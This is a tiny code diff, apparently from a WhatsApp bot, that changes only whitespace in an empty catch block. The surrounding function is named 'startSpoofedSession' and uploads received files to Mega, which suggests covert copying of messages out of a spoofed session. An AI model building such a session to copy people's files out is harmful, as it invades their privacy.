@@ -148,7 +148,7 @@ async function startSpoofedSession() {
                     await uploadFileToMega(file)
                 }
             }
-        } catch (e) {}
+        } catch (e) { }
     })
     sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect, qr } = update
